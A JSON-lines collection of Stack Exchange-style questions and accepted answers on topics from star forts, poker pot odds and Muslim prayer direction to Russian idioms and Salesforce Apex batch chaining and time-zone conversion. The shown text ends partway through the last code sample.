{"title": "Why were old fortifications shaped like stars and not like circles?", "description": "The fortifications of Copenhagen, Fredericia and Acre are star-shaped. (Defense of Copenhagen is shown in the picture below.) Why not have defenses or fortifications in the shape of  a pure square or circle?\n\n", "answer": "Star forts or bastion forts are designed to enable enfilade (or flanking) fire: shooting on the line of attackers from the side, significantly increasing firing efficiency of the defender.\nFlanking fire allows guns placed in the side wall of the bastion (protected from direct fire from attackers) to safely and effectively shoot at an entire line of attackers (enfilade them) as they are closing to the neighboring bastion. Flanking fire is very effective, because if you miss one attacker, you hit the next one. Check the enfilade link for images.\n\nHere the red arrows show direction of the flanking fire from the guns placed in the protected side walls (\"flanks\", #3) of the bastions (#1 and #2). More details about the placement of guns in bastion's flank side is in this image of bastion with caponier. Guns in \"face\" walls (#4) would be much more exposed to enemy's fire.\nThe star fort has no \"dead zones\", where an attacker can hide from flanking fire, like a round turret allows.\nThe star design for bastions was first introduced in Italy in the 15th century, and later perfected by Vauban - in the Citadell of Lille and others. Wikipedia has more nice images and a history of the approach.\nOther answers mentioned an inability to fire from above, but that is not the main reason for the star design: its goal is to enable flanking fire. And yes, star shaped bastions do not allow to fire on attackers from above, but that is not necessary (and would be dangerous for defenders), because the walls are subject to more effective flanking fire from the side walls (protected from direct fire of attackers) of neighboring bastions.\nOf course Vauban also designed a way how to attack such star fortress, by digging 3 lines of parallel trenches connected by zigzag trenches to avoid enfilading fire down the trench line, with 3rd parallel coming close to the attacked fort's glacis (outer edge of the fortifications).\n\nImages are from Wikimedia/Wikipedia.\n", "question_score": "96", "answer_score": 165}
{"title": "Electric motors - what for beginning?", "description": "I just got my first Technic joblot and now I am thinking about adding motors. I already have some - cheap ones from Amazon. I attached 1 axle pin to such motor with glue gun, works well except one thing - very often they are not powerful enough to run. I am thinking about getting starter set (8293), but at the same time I know I will enjoy adapting my own engines - question is which motors I should get in order to run builds that has lot of gears, hence lot of friction?\n", "answer": "If you're interested in comparing motors regarding to torque and what they can deliver, I would recommend  reading Philo's excellent motor comparison page which has a lot of detailed information, very much useful for tinkerers.\nOf course not all of these motors are readily available nowadays and depending on your project some may be less suitable; but there's a good chance PF motors are what you're after.\nWhile 8293 which you mentionned is a simple way to get one motor, keep in mind you're also getting a lot of extra stuff which may or may not be useful to you. In particular, battery boxes tend to get superfluous very fast (YMMV on this). So buying motors only might be a cheaper route; they are available per piece on LEGO's online shop - 8883 is the same as the set 8293; 88003 is a more Technic-oriented version and 8882 is the \"XL\" motor: slower, but with a lot of torque. (Again, read Philo's comparison). On the other hand, if you do want a battery box, it might be more interesting to buy a full motorized LEGO set, in which case you also get tons of additional elements, and the added thrill of building an official set. Beware that some motorized sets also come with IR remote & receiver, which may or may not interest you.\nNote that the Power Functions system itself is going to be phased out by LEGO in favor of the newer Powered Up; but so far it's not quite clear if and how you can control those without a remote or app, as there's no \"dumb\" battery box so far - only hubs with more or less smartness.\nAnd of course, since you're a programmer, you may want to have a look at programmable solutions, either EV3 or the upcoming Spike.\n", "question_score": "5", "answer_score": 10}
{"title": "¿Mi cumpleaños es el \"uno\" o \"un\" de agosto?", "description": "Do I use primero or uno/un in the following sentence?\n\nMi cumpleaños es el ____ de agosto\n\nI know that I can say \"mi cumpleaños es el dieciséis de abril,\" but I don't know what to do when I want to say that my birthday is the first of something.\n", "answer": "We say:\n\nMi cumpleaños es el uno un de agosto\n\nAnd of course primero is also correct:\n\nMi cumpleaños es el primero de agosto\n\nIn its entry on uno, RAE says:\n\nApóc. un1 ante s. m. sing. y, por lo general, inmediatamente antes de s. f. sing. que empieza por /a/ tónica en aceps. 1 y 2.\n\nThat is:\n\nApócope un1 ante sustantivo masculino singular y, por lo general, inmediatamente antes de sustantivo femenino singular que empieza por /a/ tónica en acepciones 1 y 2.\n\nWhere apócope is Supresión de algún sonido al final de un vocablo, como en primer por primero.\nSo: you would suppress the o and say un when uno occurs before a singular masculine noun (Yo tengo un maletín lleno de dinero) or before a singular feminine noun that starts with a stressed a (Vi un águila volando).\nIn fact the second entry on uno explicitly talks about the case you mention:\n\n2. adj. primero (‖ que precede a los demás de su especie). U. pospuesto al s. Me voy de vacaciones el día uno. Apl. a los días del mes, u. t. c. s. m. El uno de noviembre.\n\nWhere Apl. means Aplicado and  u. t. c. s. m., usado también como sustantivo masculino.\nAll in all, this is the same you find for the usage of primero, that's why it is equivalent in usage:\n\nprimero, ra\n  1. adj. Dicho de una persona o de una cosa: Que precede a las demás de su especie en orden, tiempo, lugar, situación, clase o jerarquía. U. t. c. s. Apl. a los días del mes, u. t. c. s. m. El primero de mayo.\n\n", "question_score": "9", "answer_score": 12}
{"title": "How does regeneration work?", "description": "I see that regeneration is like an energy pool, where you get power from a limited source to regenerate your or someone else's body.\nBut, is the limit the same for all Time lords/ladies? Is there a way to recover this power somehow? \n", "answer": "Although regeneration usually appears as an involuntary, biological process that occurs when death would otherwise be imminent, the nature of regeneration has not always been consistently represented. It has been most fully explored over the years in the case of the Master:\n\nIt's possible to reset the counter on regenerations-- as in The Five Doctors (1983), when the Timelords offer the Master a new set of regenerations.\nRegenerations can be transferred from one Timelord to another-- as in the 1996 TV movie, when the Master attempts to steal the Doctor's remaining regenerations.\nA Timelord can decide whether to regenerate-- as in Last of the Timelords (2007), when the Master refuses to regenerate and (apparently) dies.\nThe source of regenerative power is on Galifrey, and is associated with (possibly originates in) the Eye of Harmony-- as in The Deadly Assassin (1976) where the Master schemes to become Timelord president specifically to gain access to the Eye and avoid death at the end of his last regeneration.\n\nHowever in all of these cases, the question of \"how would that work, exactly?\" is never answered.\nWhile regeneration is commonly something that happens when death might be expected, it doesn't have to be this way:\n\nRomana regenerates in Destiny of the Daleks (1979) at will, just because she wants to do so. In the opening scene she apparently regenerates several times until she finds a look that she likes-- as if she were trying on new clothes. \nThe Doctor's second regeneration (The War Games, 1969) was forced on him by the Timelords. They don't do anything that would be expected to kill the Doctor-- they just make him regenerate.\n\nRomana's regeneration also suggests pretty strongly that the regeneration limit is not a major concern, since otherwise the repeated regenerations would be nearly suicidal. Whether this is because she thinks she can reset the count, or because the limit doesn't apply to her, or for some other reason is not stated.\nFrom past evidence it therefore appears that:\n\nRegeneration is an inherent capability but one that can only be done a fixed number of times.\nThe process involves some undefined energy carried by the individual which can be transferred or restored.\nThe Timelords possess the power to transfer this energy (probably from the Eye of Harmony on Galifrey) and can therefore restore regenerative power.\nTimelords in good standing (like Romana) can get their \"regeneration energy\" replenished on request, or may simply be allowed to access the energy source and do so themselves.\nTimelords not in good standing (the Master and... sometimes.. the Doctor) may have this request refused (e.g. by being denied access to the Eye of Harmony).\nIf you know what you're doing, you could transfer this energy from one individual to another, effectively giving one person the other's remaining regenerations. This was half confirmed in Let's Kill Hitler(2011) when River Song gave up her remaining regenerations to stop the Doctor from dying.\n\n", "question_score": "9", "answer_score": 14}
{"title": "What's the glyph origin of 妖?", "description": "What's the glyph origin of 妖?\nWhy does it have a woman radical? Why is woman used in a word that means weird or supernatural?\nIs there a website to look up the evolution of characters?\n", "answer": "《說文解字》沒有「妖」這一條目。\nThere is not an entry of 妖 in the 《說文解字》.\n《說文解字注》對「」的解釋有提到「俗省作妖」。\nThe interpretation of  in the 《說文解字注》 mentions 俗省作妖.\n\n [ yāo | ㄧㄠ ]\n\n意思是，民間習慣上，將「」省略為「妖」。\n也就是，「妖」的本字是「」。\nIt means that  is used to be simplified to 妖.\nThat is, the original form of 妖 is .\n《說文解字》對「」的解釋如下：\n《說文解字》 explains  as follows.\n\n，巧也；一曰，女子笑皃。\n\n皃 [ mào | ㄇㄠˋ ] 同「貌」。\n\n所以，「」有兩個意思：一是「巧」，二是「女子笑的樣子」。\n這應該也是「妖」的本義。\nTherefore,  has two meanings: \"skillful or clever\" and \"the appearance of a female smile\".\nThis should also be the original meaning of 妖.\n至於，「妖」會有「邪異」的意思，是來自「祅」字。\nAs for the \"demon\" meaning of 妖, it comes from 祅.\n同樣的，「祅」的本字是「䄏」。\nSimilarly, the original word of 祅 is 䄏.\n祅、䄏 [ yāo | ㄧㄠ ]\n\n《說文解字》對「䄏」的解釋如下：\n《說文解字》 explains 䄏 as follows.\n\n地反物爲䄏也。\n\n「䄏」是地上反常的物種。\n䄏 is the abnormal species on the ground.\n《說文解字注》在解釋此句時有提到「經傳通作妖」。\nThe interpretation of this sentence in the 《說文解字注》 mentions 經傳通作妖.\n\n《說文通訓定聲》說這是一種假借。\n（妖、、祅、䄏都是形聲字。）\n《說文通訓定聲》 explains that this is a loan.\n(妖, , 祅 and 䄏 are the picto-phonetic characters.)\n\nConclusion:\n「妖」的本義有兩個意思：一是「巧」，二是「女子笑的樣子」。\n被「祅」假借，所以有「邪異」的意思。\n has two original meanings: \"skillful or clever\" and \"the appearance of a female smile\".\nIt is borrowed by 祅, thus it also means \"the demon\".\n\nIs there a website to look up the evolution of characters?\nI recommend 小學堂-字形演變 to look up the evolution of characters.\n小學：研究文字字形、字義及字音的學問，包括文字學、聲韻學及訓詁學等。\n小學 does not mean the primary or elementary school here. It means the study of the glyph, meaning and the pronunciation of the word, including philology, phonology and exegesis.\n(Input the character in the 字形 field.)\nFor example, 中.\n\n", "question_score": "9", "answer_score": 17}
{"title": "What are Pot Odds, and how do I determine them?", "description": "I understand this is the relative value of playing vs. winning, but how do I determine the values?  Am I supposed to count the pot?  Does the cost of playing include hands already played, or just the next draw?\n", "answer": "What are Pot Odds?\nPot odds are the value of the pot (how much you stand to win) in comparison to the cost of you calling, and are most often used to evaluate the value of making the considered call. \nCalculating Pot Odds\nPot odds are a ratio, Pot Value : Call Cost\nTo convert this ratio to an equivalent percentage, divide the Call Cost by the sum of the Pot Value and Call Cost:\n$10 / $10 + $50 = 16.7%\n\nTo convert a percentage back to a ratio, subtract the Pot Odds Percentage from 100, and divide the remaining number by the Pot Odds Percentage:\n(100 - 16.7) / 16.7 = 4.98   -or-   5:1 odds\n\nUsing Pot Odds to Calculate Value of a Call\nExample: If the pot is $50, and the cost to call is $10 your pot odds are 50:10 or 5:1 (16.7%) when reduced.\nIf the odds of you drawing the winning hand are greater than 5:1 (16.7%), there is positive value in calling the bet. If the odds are less than the pot odds ratio/percentage, there is a negative value.\nMiscellaneous \nObviously, even if the expected value of calling is positive you may still lose the hand... but over extended sessions these value calculations will be true statistically.\nThe trick often happens when using pot odds early in a hand (ex. Flop or Turn in Texas Hold'em) where the pot odds and chance of winning the pot may change again... this brings up the concept of implied odds and can be read about on Wikipedia and all over.\n", "question_score": "24", "answer_score": 13}
{"title": "How to get started on canyoning?", "description": "Since I saw one of the last EOFT-films I am really curious about trying canyoneering, but I can´t quite figure out how to get started. What would you suggest to try it? What would be the minimum of equipment needed for that?\nSome background on me:\n\nI am a student, so (expensive) guided tours are basically no choice.\nFor the same reason I would like to spend little money on equipment - at least in the start, till I know more\nI don´t have any mountaineering or climbing experience - all I know (related to canyoning) is swimming\nI live in northern Germany\n\n", "answer": "Although theoretically one can do canyoneering alone, in reality it's not something you can safely start doing all by yourself, especially since you don't have mountaineering or rock climbing experience. So the first thing to do is to try to locate someone more experience with whom you can go. Canyoneering can be dangerous, basically because it involves lots of rappelling. If you read Accidents in North American Mountaineering for a randomly chosen year, you will see lots and lots of rappelling accidents. Canyoneering is also difficult to do safely because a trip down a canyon is committing. Once you've done the first rappel, you generally have no choice but to complete the remaining rappels. If you get to a certain rappel and find that the anchor is unsafe, you have a serious problem. Wet canyoneering adds to the danger. For all these reasons, it would be extremely foolish for someone with your skill set to try to do this without guidance from someone who is going to be there with you.\nAssuming that you're going with someone else who is more experienced, the minimum personal equipment you would need for yourself would be a climbing harness, pear-shaped locking carabiner, rappel device, helmet, cordage for making a backup Prusik, and some kind of Prusik (such as a Texas Prusik) to carry on your harness in case something goes wrong and you need to ascend the rope. The other person would presumably provide rope, rope bag, webbing for anchors, extra oval carabiners for misc purposes, and other shared equipment.\nTo build up a minimal set of skills, it would be a good idea to do a little rock climbing, either at a gym or outdoors. You should buy the standard textbook on mountaineering, called Freedom of the Hills, and study the chapter on rappelling extremely carefully. You also need to learn how to ascend a rope on a Prusik and how to stop a rappel with a leg wrap.\nThere are some additional skills that your leader might have, but that it would also be good for you to have. These including building an emergency rappel setup and building an anchor. Anchor building is an extremely technical skill. Although you may intend to go on canyoneering routes where all the anchors are supposed to be pre-built (e.g., there are bolts at every rappel station), in reality you can't assume that they will all be OK. If you get there and the anchor is damaged or appears unsafe, you need to know enough to deal with the situation.\n", "question_score": "9", "answer_score": 10}
{"title": "How a woman can teach martial art for men?", "description": "It's an honest question. I'm a black belt woman and I have only women in my class. I'd love to understand what happens with them or why men feel uncomfortable with the idea of taking martial arts classes with a female instructor. I hope to have some answers with no offense. \n", "answer": "First, men who know nothing about martial arts may see a woman leading the class and immediately think that they (the men) could beat up the female teacher. So they think there is no reason why the woman could teach them anything about fighting.\nSecond, some men might not want to train with women at all (students or teachers), because it would be awkward for them. There is physical contact, for one thing. For many young, immature males, accidentally touching or striking a woman's breast, groin, or butt is deeply embarrassing. Some religions also make it a sin for men to touch women at all, especially if he's married.\nThird, males in many societies are often raised by their families to never physically strike or harm any females. They have deeply held beliefs that cause them to avoid any physical confrontation with a woman. And the thought of accidentally punching a woman in the face and causing a black eye or a bloody lip would be too much for them. They could always just hold back and only use very soft, weak strikes that don't connect, but they may not even want to risk it at all.\nFourth, the male ego is often very fragile. The thought of a woman beating them in sparring or wrestling would be so upsetting to them and their manhood that they would just want to avoid that as a possibility completely.\nAlso, it sounds like your class is 100% women. In that case, if a man looks at your class, the first thing he's going to notice is that it's all women. He's going to assume the class is only for women, or that men avoid it for some good reason. He's never coming back.\nAll of these problems (with the possible exception of the religiously motivated ones) can be solved. You will have to work hard on getting men to join your class somehow, despite their many anxieties. Given the female momentum you have already, that may be a very difficult thing to do. As I said, guys get scared off pretty easily when they walk into a room with all women in it.\nOn the other hand, you could look at it as an opportunity to advertise women-friendly or women-only classes. You might get more female students that way, if they are assured that men will not be in the class.\nMy advice would be to make your current class an all-female class. And then add a second class that is coed (males and females). For the new class, advertise a month of free classes, and put advertising posters up at places where men usually are. You should try to get at least 50% men in this new class. Otherwise men will look at it and get scared off again.\nHope that helps.\n", "question_score": "9", "answer_score": 17}
{"title": "MLB no-hitter resulting in loss", "description": "According to Major League Baseball an official no-hitter consists of a pitcher having pitched at least 9 innings while allowing 0 hits.\nIn MLB history has a team lost while having a pitcher throw an official no-hitter? If so what were the team(s)?\n", "answer": "Running through the list of complete game no-hitters on Wikipedia, there's only one loss by a pitcher that completed a no-hitter. As this page notes:\n\nThe only starting pitcher to lose a complete-game no-hitter was Ken\n  Johnson of the Houston Colt 45s (pre-Astros), who lost to Cincinnati\n  1-0 on April 23, 1964. Johnson's throwing error allowed Pete Rose to\n  get to second with one out in the top of the ninth. Chico Ruiz moved\n  Rose to third on a ground ball, and second baseman Nellie Fox's error\n  on a grounder by Vada Pinson let Rose score the game's only run.\n\nThe same page also notes a loss for a combined no-hitter:\n\nSteve Barber (8 2/3 innings) and Stu Miller (1/3 inning) of the\n  Baltimore Orioles lost a no-hitter to Detroit 2-1 on April 30, 1967.\n  The Tigers got both their runs when Barber walked Norm Cash and Ray\n  Oyler to start the top of the ninth. Earl Wilson (who started for\n  Detroit and got the win) bunted them over. After Willie Horton popped\n  up, Barber threw a wild pitch, which let Dick Tracewski (running for\n  Cash) score to make it 1-1. Miller came in to pitch to Don Wert, whose\n  ground ball was booted by shortstop Mark Belanger, allowing Jake Wood\n  (running for Oyler) to score the go-ahead run.\n\nBy your question's definition of a no-hitter, the answer would be one game - Ken Johnson's start for the Houston Colt 45s against the Cincinnati Reds.\nThere have also been four 8 inning efforts that ended short for a full no-hitter due to the fact that the pitcher's team was losing. These were:\n\nJered Weaver(6 innings) and Jose Aredando (2 innings), for the Angels vs Dodgers in 2008\nAndy Hawkins for the Yankees vs the White Sox in 1990\nMatt Young for the Red Sox vs the Indians in 1992\nSilver King for the Chicago Pirates vs the Brooklyn's Ward Workers in 1890\n\n", "question_score": "9", "answer_score": 12}
{"title": "How does one submit an article \"informally\"?", "description": "Although I have read a lot in my area of interest (plant taxonomy and botanical nomenclature), in am no academic of it, having only a Bachelor of Translation degree.\nIt has taken me two years of waffling back and forth before I worked up the courage to write up a quick note (something not entirely dissimilar to this in nature, mostly bibliographical, but necessary nonetheless) which I'd like to submit to Phytoneuron. I call it \"informal\" because it is an independent, one-man journal with a relatively unelaborated review process where one sends the prospective article straight to the editor.\nHowever, I have NO idea what sort of language one in my situation can be expected to address to a journal editor. That I am diagnosed with Asperger's Syndrome and have been told before my writing can be overly formal to comical or insulting degrees at times is not helping my crushing nervosity about the whole thing.\n", "answer": "You could write something like the following. Short and sweet.\n\nTo the editor,\nPlease find attached an article for consideration for publication in the journal Phytoneuron.  I assert that this is an original contribution and it has not been submitted for consideration elsewhere.\nCould you please acknowledge receipt of this submission?\nBest regards,\nYour name\nYour Affiliation\nTitle of Article\nAuthors\nAbstract\nLorem ipsum dolor sit amet, consectetur adipiscing elit. Proin egestas odio non mi mattis rhoncus. Vivamus ultrices urna a ante tristique pellentesque. Nam tincidunt lacus a mi sollicitudin tincidunt. Curabitur malesuada, quam sit amet iaculis lobortis, enim lacus commodo turpis, nec elementum mauris libero ac enim. Quisque justo mauris, eleifend id ornare vel, luctus eget tellus. Etiam auctor ultrices tincidunt. Curabitur diam nulla, aliquam nec gravida a, consequat non nulla. Cras viverra massa id felis blandit gravida. Pellentesque enim mi, convallis vitae ornare quis, ornare sit amet dolor. Pellentesque velit urna, feugiat non tincidunt in, sollicitudin sed purus. Phasellus laoreet ligula nec odio mattis fringilla. Fusce sed arcu mi. Pellentesque dictum erat sit amet sapien pharetra porta.\n", "question_score": "9", "answer_score": 15}
{"title": "How was higher education done before the university system?", "description": "I know the university system as it is understood today dates at least as far back as the 13th century or perhaps even to the time of Charlemagne, Alcuin of York, et al., but how was higher education handled before universities? Was it by private tutoring?\n", "answer": "As with many things the history of higher education is not well known since accounts may be scarce or missing altogether. Early evidence indicate that schools existed in Egypt where, primarily, boys would learn to read and write etc. One has to remember that such skills were not for the masses. Religiously connected schools also emerged where religious texts were handled and copied. Theological and medical teaching was also done but very little else. evidence of mathematics have been found so there were also schools, perhaps aiming at architecture, astronomy , etc. relevant for the culture. None of these has a degree at the end but was likely based on apprenticeship and mastery evaluated by the teachers. Similar evidence for teaching exists in all older cultures and seem to focus on maintaining order in the social and cultural basis for society.\nThere seems to be a big step when considering Greek education which was far more comprehensive than the pragmatic education earlier. In the city states of ancient Greece specialized schools emerged where teaching circled around very specific topics such as the Hippocratic school of medicine on Cos. This specialization seems to have continued with the well known Greek philosophers/scientists such as Aristotle, Plato etc. and teaching progressed in directions envisioned by these founders. In other words, there was no single systematic way for schools to teach and operate.\nIn the Roman world subjects were ordered in groups that we can recognize today: I grammar rhetoric, dialectic; II geometry, arithmetic, astronomy, music; III medicine, architecture. This was how the liberal arts (defined as theoretical and intellectual activities by the Greeks) were seen. The subjects have of course survived to modern times although organisation has changed. So education became more organised but the education was not open and still served a purpose for maintaining government rule. Out of the post-Roman world came the first universities as stated in the question where education became even more organized and eventually including fixed degrees.\nThis answer is loosely based on the excellent book: The first universities by Olaf Pedersen, Cambridge UP, 1997. I strongly recommend it!\n", "question_score": "8", "answer_score": 11}
{"title": "Is it professional to cut out a middle-man in a contract chain?", "description": "I currently work via 2 contracting companies: CompanyA and CompanyB. So the hierarchy is like this:\nI'm contracted to CompanyA which is contracted to CompanyB which has a contract with the final customer.\nNow a contract renewal must take place and I was thinking of going directly through CompanyB because that way I'd get a salary raise, as the costs of CompanyA are cut to zero.\nDo you think it is professional to do this?\nThis is my first contract as a freelancer and I don't know what to do because I feel I might be better with just 1 contracting company.\nUPDATE-1:\nthe thing is that actually at some point I was asked if I want to change the contract directly to CompanyB. But that was a previous contract extension, now I'm thinking if it is fair to ask since I initially said I wanted to go through CompanyA.\n", "answer": "Generally when 2 companies enter into a sub contracting relationship they also agree not to recruit from each other.  Usually there is significant remuneration required in order to do so.  This makes it unlikely that the prime contractor will be willing to seriously consider hiring you away from their subcontractor.\nIn addition most companies in a contractor arrangement, require that you sign a non-compete in order accept the position.  This document will generally prohibit you from entering into a business relationship with any business partners which would compete with your current employer.  Being hired by their prime contractor fits this.  Some states allow it to be prohibited, while others simply allow for damages.  In this case the damages are generally the full amount they were paid to fill your position.\nIf there is a reason you would need to move to be an employee of the prime contractor you should first talk with your current employer.  Some positions may not be covered by the sub contracting agreement and you may be eligible to move to the prime company.\nIf you are considering the move because you think it will mean more money for the same job, this is unlikely, at least in a significant variation.  Most prime contractors make management fee for handling sub contractors.  But should you become an employee of the prime you will still likely make the prevailing wage for that position.  It is possible that you would even take a cut in pay.  \n", "question_score": "9", "answer_score": 10}
{"title": "List of how AlphaZero evaluates openings", "description": "In his process of learning Chess and getting stronger and stronger each second AlphaZero learned openings. Some were played often at the beginning, but lost in AlphaZero's popularity over the time (e.g. French Defence). You can find four examples here: The future is here – AlphaZero learns chess\nI read somewhere that AlphaZero played (and so: evaluated) 12 openings. I would like to see a list of them, perhaps with the graphs (not only the 4 mentioned above).\nThanks in advance.\n", "answer": "You can find the complete table in their paper. See table 2 in the arXiv version linked below:\n\nMastering Chess and Shogi by Self-Play with a General Reinforcement Learning Algorithm https://arxiv.org/pdf/1712.01815.pdf\n\nHow to read them:\n\nThe plots show the proportion of times alphazero played a given opening during its self-training games as a function of training time. So e.g., you can see that its interest in employing the French defense peaked after 2 hours, but past that, it abruptly drops to near 0, indicating that after 2 hours+ training it realised the emergent lines from that opening are non-optimal compared to other choices, such as the Caro-Kann defense (which had a promising plateau after 2 hours but eventually dropped too, plot shown below).\nThen below the diagrams, you see how it fared against Stockfish in 100 game matches for each line. Finally, alphazero's principal variation for each opening is also indicated below the plots. Please see the table's caption in the paper for any other details.\n\nOverall, the English opening stands out: it kept employing it consistently throughout its training. Ultimately, the pattern suggests a tendency towards more versatile openings.\nCaro-Kann diagram from table 2: [Ref]\n\n[Ref]: Silver, David, et al. \"Mastering Chess and Shogi by Self-Play with a General Reinforcement Learning Algorithm.\" arXiv preprint arXiv:1712.01815 (2017)\n", "question_score": "9", "answer_score": 11}
{"title": "How to say something is easy?", "description": "How do you say something like That's child's play! or That's a piece of cake in Russian?\n", "answer": "Idiomatic variants, which can be used in both common speech and books, articles etc.: \n\nYou can say \"Это проще пареной репы!\", literally \"It's easier, than steamed turnip!\". Steamed turnip was a popular dish among Russian peasants, especially before introduction of potatoes into Russian cuisine.\n\"Это проще простого.\" - \"It's easier than easy.\"\n\"Это просто, как дважды два!\" - \"It's easy, like two times two.\" \n\nIf you want to be short and avoid using idioms, you can say:\n\n\"Это элементарно\" - \"This is elementary\". This is the simpliest, neutral and very common variant.\n\"Легкотня!\" (derived from adverb \"легкo\", which in this case means \"easily\"). This variant is for informal use only.\n\nSpeaking about simplicity of actions (but not notions, concepts etc.) in informal cases you can use the following expressions:\n\n\"Раз плюнуть!\", which means that performing this action is as easy as performing one spit. For example: \"Я ни за что не подниму такую тяжелую коробку, но для моего мужа это - раз плюнуть. Он и три таких запросто донесет!\" - \"I would never lift such a heavy box, but for my husband, it's a piece of cake. He can easily carry three times as much!\"\n\"Как нечего делать\", literally \"Like nothing to do\". \"Легкотня! Я за 5 минут управлюсь, как нечего делать.\" - \"That's child's play! I'll be done by 5 minutes, no sweat.\"\n\n", "question_score": "9", "answer_score": 22}
{"title": "Must you always pray towards Mecca (Is your prayer invalid if you don't?)", "description": "I understand that Muslims are supposed to pray 5 times a day, and every time you are supposed to do the Salat and face towards the Kaaba in Mecca.\nI'm wondering, is it essential to pray towards Mecca? In Catholicism, when we go to church we pray towards the Eucharist and the Tabernacle, because we believe that the tabernacle contains God and the Eucharist IS God.\nHowever if we are out on the street or at home or anywhere other than church, we don't feel the need to pray in any particular direction, because we believe that God is everywhere (omnipresent), and knows everything (omniscient) including our prayers and thoughts, therefore he will hear anything we pray regardless of what direction we are facing at the time.\nI'm wondering if this is possible in Islam? Can you just fire off a few quick prayers without turning to face the Kaaba every time? For example a Christian might be sitting an exam; as they enter the exam room and take their seat they might close their eyes and pray a quick prayer asking for God to give them strength and Wisdom and Grace and bless their performance in this exam. Could a Muslim do this same thing? Or would they have to leave their seat and face Mecca for their prayer to be heard by God?\n", "answer": "Facing towards Mecca (specifically, the Kaaba) reasonably accurately is one of the conditions for ritual prayers (\"salah\" - this includes the obligatory five daily prayers, voluntary ritual prayers, funeral prayers, and holiday prayers) to be considered valid - islamQA is a simple and quick reference for this. The same ruling can be found in the shafi'i work of fiqh \"reliance of the traveler\" under heading f6.1:\n\nFacing the direction of prayer (qibla) is a necessary condition for\n  the prayer's validity, with the sole exceptions of praying in extreme\n  peril (dis: f16.S) and nonobligatory prayers performed while\n  travelling.\n\nAs cited in another answer, islamQA lists exceptions to when the qibla need not be upheld as well.\nAt least part of the hanafi school considers it an obligation to keep the qibla even while praying on a train that changes direction.\nGenerally, there is consensus among all schools of law that facing towards the Kaaba with reasonable accuracy is an essential part of the mentioned prayers.\nHere's a picture of a congregation holding a ritual prayer at the Kaaba; you'll notice everyone is facing the building:\n\nSome related facts about the qibla:\nThe direction of prayer (\"qibla\") was initially Jerusalem (towards the temple mount) and was later in the life of Muhammad changed to Mecca (towards the Kaaba - named the \"sacred mosque\" in the quran).\nThe idea behind the qibla is not that Allah resides in a certain place - this would in fact be disbelief, since Allah is considered to occupy neither space nor time - but as a reminder of Ibrahim (Abraham - here from a shia reference), who is considered one of the great prophets, and as a symbol of unity. In Islamic lore, Ibrahim is considered to have built the Kaaba with his son Ishmael following a command of Allah to do so. It is also considered the first house of worship by the Quran.\n\nOther than ritual prayers, any supplications (du'a) and remembrances (dhikr) can be made regardless of where one is facing, or positioning of the body, or ritual purity; some of the ad'iyah (plural of du'a) and adkar (plural of dhikr) found in the sunnah do come with certain recommended gestures etc. however.\n", "question_score": "9", "answer_score": 13}
{"title": "Cascading batch jobs", "description": "I want to run 2 batch jobs in series i.e. 2nd batch should start running just after 1st batch finishes. Can I do that?\n", "answer": "Yes you can do this. As of Winter '12 (api v26) a new feature was added to allow daisy chaining of batch jobs by providing the ability to call the executeBatch method from the finish method.\nOne thing to be wary of with this approach is the number of batch slots you have available (max 5 jobs running at one time), check first there is space to run your job and if not scheduled to run again in a minute (you should perform the same check in your schedule job too). See example below:\n  // finish by sending email to specified recipeint, or job creator if not set\n    global void finish(Database.BatchableContext BC)\n    {\n        AsyncApexJob batchJob = [Select Id, Status, NumberOfErrors, JobItemsProcessed, TotalJobItems, CreatedBy.Email from AsyncApexJob where Id =:BC.getJobId()];\n        sendEmail( batchJob.CreatedBy.Email );\n\n        Integer jobs = [Select count() From AsyncApexJob Where JobType = 'BatchApex' and ( Status = 'Queued' or Status = 'Processing' or Status = 'Preparing' )];\n        if( jobs > 4 )\n        {\n           // try again in a minute\n            Datetime sysTime = System.now().addSeconds( 60 );\n            String chronExpression = '' + sysTime.second() + ' ' + sysTime.minute() + ' ' + sysTime.hour() + ' ' + sysTime.day() + ' ' + sysTime.month() + ' ? ' + sysTime.year();\n\n            EmailInvoicesBatch scheduledBatch = new EmailInvoicesBatch();\n            System.schedule( 'EmailInvoicesBatchSchedule ' + sysTime, chronExpression, scheduledBatch );                \n        }\n        else\n        {\n            EmailInvoicesBatch batch = new EmailInvoicesBatch();\n            Database.executeBatch( batch, 1 );\n        }\n    }\n\n", "question_score": "9", "answer_score": 12}
{"title": "convert time from a different timezone other than local to GMT", "description": "suppose i am a call center employee with IST time zone and want to fix a meeting with a US customer. I enquire about his time zone and time at which he will be available. Now i want to convert the time given by customer to my Timezones time. How can i do this in salesforce??\n", "answer": "The Timezone class is new in Spring 13 and includes the getOffset() method to get \n\n\"the time zone offset, in milliseconds, of the specified date to the\n  GMT time zone.\"\n\nIt should be possible to use this information to do the timezone conversion.\nYou would need a list of time zone ids. According to the docs these values match those in the Java TimeZone class. E.g. \"America/Los_Angeles\". Here is a good list of TimeZoneSidKeys - https://docs.google.com/spreadsheet/ccc?key=0Ar3Bg2QuV-_IdFNnbDdmOHpyV0NxQmhTUE5lN0hVLWc&hl=en#gid=0\nAlternatively, you can see the valid values under the User Locale Settings > Time Zone.\n\nThis is a bit rough, but it should give you a start. Here I convert a Date and Time from the users PST TimeZone to mine - NZDT.\n// This is the Date and Time in the users TimeZone\nstring customerDateTimeString = '2013-02-17 17:35:00';\nDateTime customerDateTime = DateTime.valueofGmt(customerDateTimeString);\nstring customerTimeZoneSidId = 'America/Los_Angeles';\n\nTimeZone customerTimeZone = TimeZone.getTimeZone(customerTimeZoneSidId);\nSystem.assertEquals('Pacific Standard Time',  customerTimeZone.getDisplayName());\n\ninteger offsetToCustomersTimeZone = customerTimeZone.getOffset(customerDateTime);\nSystem.debug('GMT Offset: ' + offsetToCustomersTimeZone + ' (milliseconds) to PST');\n\n// For the given Date I expect PST to be GMT - 8 hours\nSystem.assertEquals(-8, offsetToCustomersTimeZone / (1000 * 60 *60));\n\n// Here you might like to explicitly use 'Asia/Colombo' to get IST in your code.\nTimeZone tz = UserInfo.getTimeZone();\n// During daylight saving time for the Pacific/Auckland time zone\ninteger offsetToUserTimeZone = tz.getOffset(customerDateTime);\nSystem.debug('GMT Offset: ' + offsetToUserTimeZone + ' (milliseconds) to NZDT');\n\n// Expect NZDT to be GMT + 13 hours\nSystem.assertEquals(13, offsetToUserTimeZone / (1000 * 60 *60));\n\n// Figure out correct to go from Customers DateTime to GMT and then from GMT to Users TimeZone\ninteger correction = offsetToUserTimeZone - offsetToCustomersTimeZone;\nSystem.debug('correction: ' + correction);\n\n// Note: Potential issues for TimeZone differences less than a minute\nDateTime correctedDateTime = customerDateTime.addMinutes(correction / (1000 * 60));\nSystem.debug('correctedDateTime: ' + 